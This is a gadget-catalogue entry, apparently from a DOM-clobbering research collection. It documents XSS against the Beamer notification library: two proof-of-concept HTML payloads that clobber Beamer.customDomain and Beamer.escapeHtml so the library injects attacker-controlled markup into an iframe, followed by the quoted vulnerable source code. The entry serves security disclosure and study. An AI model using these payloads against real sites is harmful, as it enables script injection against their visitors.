---
description: Inform and educate your customers with two-way communication that allows you to learn what customers love, and what they need.
gadgets:
  Latest:
    authors:
      - twitter:kevin_mizu
    tags:
      - chrome-browser
      - safari-browser
      - a-tag
      - any-tag
      - id-attr
      - name-attr
      - before-func-call
    pocs:
      - description: The Beamer library uses the `Beamer.customDomain` value as an `<iframe src="">` when `enableAutoRefresh` and `activateAutoRefresh` configuration options are specified.
        code: |
          <!-- user input -->
          <p id="Beamer"></p><a id="Beamer" name="customDomain" href="javascript:alert(document.domain)//"></a>

          <script>
            var beamer_config = {
                product_id : "TCocQlcK73424",
                user_id: "00000000-0000-0000-0000-000000000000"
            };
          </script>
          <script type="text/javascript" src="[current-location]assets/xss/beamer/beamer-embed.js" defer="defer"></script>
          <script>
            setTimeout(() => { Beamer.update({language: "FR"}) }, 1000); /*
            window.Beamer&&window.Beamer.update()
            */
          </script>
      - description: Even if a sanitizer is being used, it's possible to abuse HTMLCollection items not being writable to disable the `Beamer.escapeHtml` function.
        code: |
          <!-- user input -->
          <p id="Beamer" name="pushDomain"></p><p id="Beamer"></p><a id="Beamer" name="customDomain" href="http:'/onload='alert(document.domain)'/x='"></a><a id="beamerOverlay"><p id="Beamer" name="escapeHtml"></p></a>

          <script>
            var beamer_config = {
                product_id : "TCocQlcK73424",
                user_id: "00000000-0000-0000-0000-000000000000"
            };
          </script>
          <script type="text/javascript" src="[current-location]assets/xss/beamer/beamer-embed.js" defer="defer"></script>
          <script>
            setTimeout(() => { Beamer.update({language: "FR"}) }, 1000); /*
            window.Beamer&&window.Beamer.update()
            */
          </script>
    more-info: |
      **Root Cause**

      ```js
      Beamer.update = function(a) {
          if ("undefined" !== typeof a) {
              var b = !1;
              // ...
              "undefined" !== typeof a.language && beamer_config.language !== a.language && (beamer_config.language = a.language,
              b = !0);
              // ...
              for (var c in a)
                  if (a.hasOwnProperty(c) && !(-1 < Beamer.reservedParameters.indexOf(c))) {
                      var d = a[c];
                      "undefined" === typeof d || "object" === typeof d || Beamer.isFunction(d) || beamer_config[c] === d || (beamer_config[c] = d,
                      b = !0)
                  }
              b && (Beamer.started ? Beamer.appendAlert(!0, !0) : Beamer.init()) // HERE
          }
      }
      ```

      ```js
      Beamer.appendAlert = function(a, b) { // HERE
          // ...

          if (!Beamer.isEmbedMode() && ("undefined" === typeof beamer_config.auto_refresh || beamer_config.auto_refresh) && "undefined" !== typeof l && l && "undefined" !== typeof k && k) {
              if (h || "undefined" !== typeof b && b) 
                  _BEAMER_IS_OPEN ? Beamer.removeOnHide = !0 : Beamer.removeIframe(), // HERE
                  Beamer.setCookie(_BEAMER_LAST_UPDATE + "_" + beamer_config.product_id, (new Date).getTime(), 300);
              h = Beamer.getConfigParameter(f, "autoRefreshTimeout");
              "undefined" !== typeof h ? Beamer.autoRefreshTimeout = h : "undefined" !== typeof Beamer.autoRefreshTimeout && Beamer.autoRefreshTimeout || (Beamer.autoRefreshTimeout = 1201E3);
              h = Beamer.getConfigParameter(f, "enableUpdatesListener");
              "undefined" !== typeof h && h ? (f = Beamer.getConfigParameter(f, "updatesDelay"),
              "undefined" !== typeof f && 0 <= f && (Beamer.updatesMaxDelay = f),
              Beamer.appendUtilitiesIframe(!0)) : Beamer.prepareAutoRefresh() // HERE
      ```

      ```js
      Beamer.appendUtilitiesIframe = function(a) {
          if ("undefined" === typeof Beamer.config.disableUtilitiesIframe || !Beamer.config.disableUtilitiesIframe)
              try {
                  if (!document.getElementById("beamerUtilities")) {
                      var b = "undefined" !== typeof Beamer.customDomain ? Beamer.customDomain : _BEAMER_URL;
                      b += "utilities?app_id=" + beamer_config.product_id;
                      "undefined" !== typeof Beamer.escapeHtml && (b = Beamer.escapeHtml(b));
                      Beamer.appendHtml(document.body, "<iframe id='beamerUtilities' src='" + b + "' width='0' height='0' frameborder='0' scrolling='no'></iframe>")
                  }
                  "undefined" !== typeof Beamer.customDomain && Beamer.setIframeCookies();
                  "undefined" !== typeof a && a && Beamer.initUpdatesListener()
              } catch (c) {
                  Beamer.logError(c)
              }
      }
      ```
    links:
      - https://mizu.re/post/under-the-beamer
---
